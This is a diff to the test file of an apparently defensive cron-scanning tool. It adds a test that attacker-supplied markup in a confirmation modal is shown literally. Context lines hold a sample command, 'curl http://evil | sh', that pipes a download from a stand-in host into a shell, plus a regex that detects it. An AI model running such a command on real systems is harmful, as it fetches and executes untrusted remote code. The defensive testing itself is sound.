@@ -905,3 +905,25 @@ def test_F12_regex_rules_keep_the_scan_cap():
     padded = "A" * 10_000 + " curl http://evil | sh"
     assert not _custom_rule("regex", r"curl\s+http").matches("/etc/cron.d/x", padded)
     assert _custom_rule("regex", r"curl\s+http").matches("/etc/cron.d/x", padded[-30:])
+
+
+# ─── F-13: the confirm modal renders attacker text literally ────────────────
+
+async def test_F13_markup_in_remediation_description_is_shown_literally():
+    from textual.app import App
+    from textual.widgets import Static
+    from ubuntils.detectors.finding import Finding, Severity
+    from ubuntils.tui.confirm_modal import ConfirmModal
+    finding = Finding(rule_id="CRON_TMP_PATH", severity=Severity.HIGH, title="t",
+                      description="d", artifact_path="/etc/cron.d/x", raw_value="r",
+                      remediation_available=True,
+                      remediation_description="Remove [/bold] and [red]this[/red] line")
+
+    class _App(App):
+        def on_mount(self):
+            self.push_screen(ConfirmModal(finding))
+
+    async with _App().run_test() as pilot:
+        await pilot.pause()
+        desc = pilot.app.screen.query_one("#fix-desc", Static)
+        assert str(desc.render()) == "Remove [/bold] and [red]this[/red] line"
